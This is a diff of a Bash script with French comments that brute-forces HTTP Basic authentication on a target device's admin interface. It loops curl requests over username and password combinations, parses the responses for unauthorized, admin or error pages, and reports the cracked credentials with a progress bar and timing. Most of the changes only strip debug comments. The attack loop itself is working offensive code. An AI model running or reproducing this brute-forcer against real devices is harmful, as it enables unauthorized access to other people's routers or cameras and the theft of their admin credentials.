@@ -94,8 +94,6 @@ screen_height=$(tput lines) #$(stty size|cut -d " " -f 1) #
 #                                                       FONCTIONS
 ####################################################################################################################
 
-
-
 #FUNCTION:
 # detecte si erreur 401 : page non autorisée
 function checkConnectiviteCible {
@@ -138,8 +136,6 @@ function fullModeleDetect {
 
 	echo $modele_complet
 	}
-
-
 
 #FUNCTION:
 # detecte si erreur 401 : page non autorisée
@@ -247,7 +243,6 @@ function infosGeolocalisation {
 
 	#retirer les infos inutiles
 	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
-	#infosDbIpDotCom=${infosDbIpDotCom/continentCode*countryName:/'Pays:'}
 	
 
 	#Mise en forme pour le script
@@ -621,7 +616,6 @@ for fichier in ${liste_fichiers_a_verifier[*]}; do
 done
 
 #verifier si les entetes du fichier log existent deja ou pas
-#echo -e "hey:"$(logEnteteCheck)
 logEnteteCheck
 
 #On calcul le nombre de probabilités si les fichiers  existent
@@ -650,12 +644,6 @@ echo -en $banniere|base64 -d
 texte_ver="$vocab_version $ab_ver $puce_banner"
 espaces=$(ajouterEspacesSlogans "$texte_ver")
 echo -e $col_texte_version$espaces$texte_ver
-
-#slogan
-#texte_slogan="$ab_slogan$ab_ver"' Version '
-#espaces=$(ajouterEspacesSlogans "$texte_slogan")
-#echo -e $col_logo' Version '$ab_ver$espaces$ab_slogan
-
 
 #slogan V2
 texte_slogan="$ab_slogan $puce_banner"
@@ -804,6 +792,9 @@ if [ "$noPing" != "OUI" ];then
 		echo -e "$col_titre$puce_level_2$vocab_results :$col_erreur $vocab_echec"
 		if [ "$noPing" != "OUI" ];then
 			echo -e "$col_titre$puce_level_2$err_ping :$col_erreur $err_exit"
+			if [ "$deja_attaquee" != "TRUE" ];then
+				echo -e " NOT_CONNECTED" >> $fichier_hist_defaut
+			fi
 			exit
 		else
 			echo -e "$col_titre$puce_level_2$element_testco_ignore_skip:$col_erreur $element_testco_ignore_skip_value"
@@ -957,8 +948,6 @@ if [ "$skipGeo" != "OUI" ];then
 fi
 echo -e "$col_titre"
 
-
-
 ####################################################################################################################
 #                                                TRAITEMENT/ATTAQUE
 ####################################################################################################################
@@ -976,34 +965,23 @@ if [ "$checkOnly" != "OUI" ];then
 			total_fait=$(($total_fait+1))		
 			total_fait_txt=$(addZeros $nb_combinaisons $total_fait)
 			progression_pourcent=$(($total_fait*100/$nb_combinaisons))
-			progression_pourcent_txt=$(addZeros 100 $progression_pourcent)		
-			
-			#debug mode: if [ $total_fait -gt 15 ]; then exit; fi
-
+			progression_pourcent_txt=$(addZeros 100 $progression_pourcent)	
 			
 			#avancement:
 			ligne_a_afficher="$col_titre$puce_level_1$element_attack $col_section$col_titre$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$col_titre [$col_texte$user$col_titre:$col_texte$mdp$col_titre] "
 			echo -en "$ligne_a_afficher"			
 			#Requete HTTP
 			/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
-			
-			#pour debug rapide: if [ $total_fait -gt 5 ];then exit; fi
-			
+						
 			#analyse de la reponse
 			test_unauthorized=$(cat $tmp |grep --binary-files=text -i $echec)
-			#echo "@test_unauthorized@=$test_unauthorized"
 			test_javascript=$(cat $tmp |egrep --binary-files=text -i 'enable JavaScript')
-			#echo "@test_javascript@=$test_javascript"
 			test_administration=$(cat $tmp |egrep --binary-files=text -i 'administration tools')
-			#echo "@test_administration@=$test_administration"
 			test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
-			#echo "@test_configuration@=$test_configuration"
 			test_page400=$(cat $tmp |egrep --binary-files=text -i '<TITLE>400 ')
 			test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 ')
 			test_page500=$(cat $tmp |egrep --binary-files=text -i '<TITLE>500 ')
-			#echo "@test_page404@=$test_page404"
 			test_presence_lien_admin=$(cat $tmp |egrep --binary-files=text -i '/admin/users.shtml') #utile dans les cas javascript
-			#echo "@test_presence_lien_admin@=$test_presence_lien_admin"
 
 			#si le titre contien "unhotorized"
 			if [ ${#test_unauthorized} -gt 0 ];then
@@ -1024,8 +1002,6 @@ if [ "$checkOnly" != "OUI" ];then
 						else
 							res_test_auth="$col_erreur$msg_echec: $err_javascript_required"
 							echec_js="OUI"
-							#echo -e $bleu;cat $tmp;echo -e $reset
-							#break
 						fi
 					#si pas la page admiistration et pas de message JS
 						
@@ -1092,12 +1068,11 @@ if [ "$checkOnly" != "OUI" ] ; then
 		#Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. 
 		message_fin=${message_fin//"__TOTALTIME__"/"$top_timer"}
 		message_fin=${message_fin//"__TOTALCOMBI__"/"$total_fait"}
-		#echo -e "$col_titre$puce_level_2""Succes: $col_texte$message_fin"
 		tput cuu1;tput el
-		screen_width=$(tput cols) #$(stty size|cut -d " " -f 2)
+		screen_width=$(tput cols)
 		if [ ${#ligne_complete} -gt $screen_width ];then
 			tput cuu1;tput el
-			echo -e "" #"$res_test_auth "$screen_width/"${#ligne_complete}";sleep 1
+			echo -e ""
 		fi
 		echo -e "$col_titre$puce_level_1$element_attack $ip:$col_succes $vocab_succes$col_texte $message_fin"
 		echo -e "$col_titre$puce_level_2$vocab_login: $user"
